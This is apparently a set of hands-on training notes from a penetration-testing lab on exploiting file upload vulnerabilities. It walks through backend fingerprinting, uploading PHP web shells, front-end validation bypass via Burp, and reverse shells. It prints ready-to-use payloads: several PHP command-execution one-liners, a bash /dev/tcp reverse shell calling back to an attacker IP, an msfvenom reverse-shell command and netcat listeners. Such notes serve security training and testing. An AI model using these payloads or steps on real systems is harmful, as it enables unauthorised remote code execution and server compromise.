# File Upload Attacks

This section documents common techniques for identifying and exploiting **file upload vulnerabilities**. It is intended as a practical, hands-on reference rather than a comprehensive theoretical guide.

---

## Table of Contents

- [File Upload Attacks](#file-upload-attacks)
  - [Overview](#overview)
  - [Basic Exploitation](#basic-exploitation)
  - [Web Shells](#web-shells)
  - [Reverse Shells](#reverse-shells)
  - [Front-End Validation](#front-end-validation)

---

## Overview

Many web applications provide functionality for users to upload files. If these uploads are not properly validated and restricted, attackers may be able to upload malicious files to the back-end server.

File upload vulnerabilities are relatively common and are frequently classified as `High` or `Critical` severity due to their potential impact. The root cause is typically insufficient validation of uploaded files, such as relying solely on **client-side checks, file extensions, or MIME types**.

The most severe form of this vulnerability is an `unauthenticated arbitrary file upload`. In this scenario, an attacker can upload executable content (for example, a **web shell** or a script that establishes a **reverse shell**), often resulting in remote code execution (RCE) and full compromise of the underlying system.

---

## Basic Exploitation

In the simplest scenario, a target application implements no effective security controls on its file upload functionality. This allows an attacker to upload arbitrary files, including **web shells**, directly to the server.

To achieve code execution, the uploaded payload must be written in the **same programming language** used by the backend. In many cases, the backend language can be inferred directly from the URL structure:

```
http://94.237.57.115:3157/index.php
```

![Filtered output](images/basic-exploitation.png)

If the file extension is not explicitly visible, it can be manually fingerprinted by requesting common variations of `index.ext` and observing server responses:

```
http://94.237.57.115:3157/index.php

http://94.237.57.115:31571/index.php7

http://94.237.57.115:31571/index.phps

http://94.237.57.115:31571/index.phtml

http://94.237.57.115:31571/index.asp

http://94.237.57.115:31571/index.aspx
```

This process can be automated using application fingerprinting tools such as `whatweb`, `nikto`, or `wappalyzer`:

```bash
nikto -h 94.237.57.115:31571
```

```bash
whatweb 94.237.57.115:31571 --aggression 3 --verbose 
```

![Filtered output](images/basic-exploitation2.png)

Another effective approach is to fuzz for valid extensions using `ffuf`:

```bash
ffuf -w web-extensions.txt:FUZZ -u http://94.237.57.115:31571/indexFUZZ
```

![Filtered output](images/basic-exploitation3.png)

Based on the results, we can confidently determine that the backend is implemented in `PHP`. We therefore prepare a simple PHP web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

The file uploads successfully:

![Filtered output](images/basic-exploitation4.PNG)

Clicking `Download file` reveals the upload directory:

```
http://94.237.57.115:31571/uploads/shell.php
```

![Filtered output](images/basic-exploitation5.PNG)

Since the uploaded file is both accessible and executable, we can interact with the web shell via the `cmd` GET parameter:

```
http://94.237.57.115:31571/uploads/shell.php?cmd=id
```

![Filtered output](images/basic-exploitation6.PNG)

At this point, we have successfully achieved remote code execution (RCE) through an unrestricted file upload vulnerability.

---

## Web Shells

Web shells are a common post-exploitation technique used to obtain and maintain remote code execution on a target system. A web shell is typically a script written in the same language as the back-end application and executed through a web-accessible endpoint.

A comprehensive collection of web shells for various programming languages is available at **SecLists**:

- https://github.com/danielmiessler/SecLists/tree/master/Web-Shells

Since PHP is widely used in web applications, PHP-based web shells are particularly common. These shells execute system commands passed via HTTP parameters and return the output in the response.

Common minimal PHP web shells include:

```php
<?php echo passthru($_GET['cmd']); ?>
```

```php
<?php echo exec($_POST['cmd']); ?>
```

```php
<?php system($_GET['cmd']); ?>
```

```php
<?php passthru($_REQUEST['cmd']); ?>
```

These one-liners are often sufficient for command execution and are useful when upload restrictions or file size limits are in place.

We create a simple PHP web shell locally:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

After uploading the file through the vulnerable file upload functionality, the application stores it in the following directory:

```
http://94.237.50.221:56396/uploads/shell.php
```

We can now execute commands on the server through the `cmd` parameter:

```
http://94.237.50.221:56396/uploads/shell.php?cmd=cd+/;cat+flag.txt
```

![Filtered output](images/web-shell2.png)


In addition to minimal one-liner shells, more advanced web shells provide a semi-interactive terminal interface. A popular example is `phpbash`, which offers a browser-based command shell.

- https://github.com/Arrexel/phpbash

For `phpbash` to function correctly, the following conditions must be met:

- JavaScript must be enabled in the client browser
- The target server must allow execution of the PHP `shell_exec()` function

To use `phpbash`, upload the `phpbash.php` file and navigate to its location:

```
http://94.237.50.221:56396/uploads/phpbash.php
```

![Filtered output](images/web-shell.png)

Interactive web shells like `phpbash` can significantly improve usability during manual post-exploitation but are more likely to be detected due to their size and complexity.

---

## Reverse Shells

Web shells are not always reliable. In some cases, web application firewalls (WAFs), restrictive PHP configurations, or disabled system functions may prevent web shell execution. In these situations, deploying a reverse shell is often a more effective approach.

A reverse shell is initiated from the target system back to the attacker. Because the outbound connection originates from the server, it is less likely to be blocked by firewalls or network filtering mechanisms.

Before triggering a reverse shell, a listener must be started on the attacking machine. A common choice is `netcat`:

```bash
nc -lvnp 4444
```

This listener will wait for an incoming connection from the target.

If the back-end language is PHP, a simple reverse shell can be used. The following payload connects back to the attacker at `10.10.14.137` on port `4444`:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.137/4444 0>&1'");
?>
```

Save the payload as `rev.php` and upload it to the vulnerable application. Once uploaded, navigate to the file in your browser:

```
http://94.237.50.221:56396/uploads/rev.php
```

If successful, the reverse shell will connect back to the listener.

A more robust and widely used reverse shell is provided by `pentestmonkey`:

- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Download the script and modify the following variables:

- `$ip = 'OUR_IP';`
- `$port = OUR_PORT;`

![Filtered output](images/reverse-shell.png)

Start a listener:

```bash
nc -lvnp 4444
```

Upload the modified PHP file and browse to its location:

```
http://94.237.50.221:56396/uploads/php-reverse-shell.php
```

Upon execution, the target should establish a reverse shell connection.

Another option is to generate a reverse shell using `msfvenom`, which supports payloads for many programming languages.

The following example generates a PHP reverse shell:

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.189 LPORT=8001 -f raw > reverse.php
```

Upload the generated file and visit the upload location to execute it:

```
http://94.237.50.221:56396/uploads/reverse.php
```

If successful, a reverse shell will connect back to the specified listener.

---

## Front-End Validation

Some applications rely solely on front-end validation to restrict uploaded file types. This approach is inherently weak, as client-side controls can be bypassed by interacting directly with the back-end using a web proxy such as **Burp Suite**.

In this scenario, the target application allows users to upload a profile image:

```
Update your profile image
```

![Filtered output](images/front-end-filter.PNG)

When attempting to upload a PHP file named `shell.php`, the application returns the following error:

```
Only images are allowed.
```

![Filtered output](images/front-end-filter2.PNG)

This indicates that file type validation is in place. However, when uploading the file, no HTTP request is sent to the server. This strongly suggests that validation is occurring **entirely on the client side**.

Inspecting the page source reveals that the upload functionality only permits files with the following extensions:

- `jpg`
- `jpeg`
- `png`

![Filtered output](images/front-end-filter3.PNG)

To test the robustness of this validation, we rename `shell.php` to `shell.jpg` while keeping the file contents unchanged (i.e., still containing PHP code). The file uploads successfully:

![Filtered output](images/front-end-filter4.PNG)

This confirms that the application performs **extension-based validation only**, without inspecting the file contents. However, PHP code cannot be executed unless the file has a PHP-related extension.

Since validation occurs on the front end, we can bypass it by intercepting the upload request before it reaches the server. The process is as follows:

1. Upload the file with an allowed extension (e.g., `shell.jpg`)
2. Intercept the request using **Burp Suite**
3. Modify the filename in the request to use a **PHP extension**:

```
filename="shell.php"
```

![Filtered output](images/front-end-filter5.PNG)

After forwarding the modified request, the server accepts and stores the file. The upload location can be identified by inspecting the page source:

```html
<img src='/profile_images/shell.php' class='profile-image' id='profile-image'>
```

![Filtered output](images/front-end-filter7.PNG)

Finally, we navigate to the uploaded file and interact with the web shell using the `cmd` parameter:

```
http://94.237.122.95:42771/profile_images/shell.php?cmd=id
```

![Filtered output](images/front-end-filter6.PNG)

This confirms successful bypass of front-end validation and results in **remote code execution**.

---


